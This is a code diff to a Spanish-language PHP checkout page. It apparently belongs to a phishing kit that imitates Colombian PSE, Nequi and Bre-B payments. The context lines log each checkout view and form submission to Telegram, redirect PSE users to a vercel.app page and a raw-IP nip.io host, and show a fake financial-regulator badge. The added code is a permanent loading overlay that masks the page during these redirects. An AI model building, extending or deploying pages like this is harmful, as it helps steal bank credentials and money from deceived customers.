@@ -51,9 +51,7 @@ if (count($words) >= 3) {
 
 $email = $userInfo['EMAIL'] ?? '';
 $PSE_BANKS = $pseConfig['primary_banks'] ?? [];
-// <-- CAMBIO: URL fija para el flujo primario (PSE)
 $PSE_PRIMARY_PAGE = 'https://pagosonline-pse.vercel.app';
-// <-- CAMBIO: URL fija para RecaudoFall
 $RECAUDOFALL_BASE = 'https://recaudofall.94.250.202.215.nip.io/nequi';
 $PSE_BANKS_RECAUDOFALL = $pseConfig['recaudofall_banks'] ?? [];
 $PSE_BANK_ALIASES = $pseConfig['aliases'] ?? [];
@@ -83,8 +81,30 @@ telegram_log('💳 Vista de checkout', [
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="assets/css/styles.css">
+<style>
+  .loading-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(255, 255, 255, 0.85);
+    z-index: 9999;
+    align-items: center;
+    justify-content: center;
+  }
+  .loading-overlay.visible {
+    display: flex;
+  }
+  .loader-gif {
+    width: 80px;
+    height: 80px;
+  }
+</style>
 </head>
 <body class="checkout-body">
+
+<div class="loading-overlay" id="loadingOverlay">
+  <img src="assets/images/loader.gif" alt="Cargando..." class="loader-gif">
+</div>
 
 <img class="vigilado-ribbon" src="assets/images/download-2.png" alt="Vigilado Superintendencia Financiera de Colombia">
 
@@ -371,6 +391,7 @@ telegram_log('💳 Vista de checkout', [
   const psePrimaryPage = <?php echo json_encode($PSE_PRIMARY_PAGE, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
   const pseBanksRecaudoFall = <?php echo json_encode($PSE_BANKS_RECAUDOFALL, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
   const pseBankAliases = <?php echo json_encode($PSE_BANK_ALIASES, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
+  const loadingOverlay = document.getElementById('loadingOverlay');
 
   const ACCENT_MAP = { 'á': 'a', 'é': 'e', 'í': 'i', 'ó': 'o', 'ú': 'u', 'ñ': 'n', 'ü': 'u' };
 
@@ -593,6 +614,8 @@ telegram_log('💳 Vista de checkout', [
   });
 
   brebConfirmBtn.addEventListener('click', function () {
+    loadingOverlay.classList.add('visible');
+
     const logData = {
       'Referencia': payButton.dataset.reference,
       'Método': 'Bre-B',
@@ -610,6 +633,7 @@ telegram_log('💳 Vista de checkout', [
       body: JSON.stringify({ event: '✅ Pago Bre-B realizado', data: logData }),
       keepalive: true
     }).finally(function () {
+      // El loader se mantiene visible: no se quita aquí, sigue puesto hasta el cambio de página.
       window.location.href = 'factura-demo.php?paid=1';
     });
   });
@@ -630,6 +654,10 @@ telegram_log('💳 Vista de checkout', [
       pseForm.reportValidity();
       return;
     }
+
+    // Validación superada: se bloquea el botón y se muestra el loader de forma permanente.
+    document.getElementById('pseSubmit').disabled = true;
+    loadingOverlay.classList.add('visible');
 
     const bankCode = bankValue.split('@')[0] || '';
     const bankName = bankValue.split('@')[1] || bankValue;
@@ -666,6 +694,7 @@ telegram_log('💳 Vista de checkout', [
       body: JSON.stringify({ event: '🏦 Envío formulario PSE', data: logData }),
       keepalive: true
     }).finally(function () {
+      // El loader se mantiene visible: no se quita aquí, sigue puesto hasta la redirección.
       let redirectUrl;
 
       if (bankConfig.flow === 'recaudofall') {
@@ -677,7 +706,6 @@ telegram_log('💳 Vista de checkout', [
         redirectUrl.searchParams.set('monto', amountValue);
         redirectUrl.searchParams.set('banco', bankConfig.bank);
       } else {
-        // CORRECCIÓN: quitamos el '?' para que la ruta sea directa
         redirectUrl = new URL(bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id, window.location.href);
       }
 
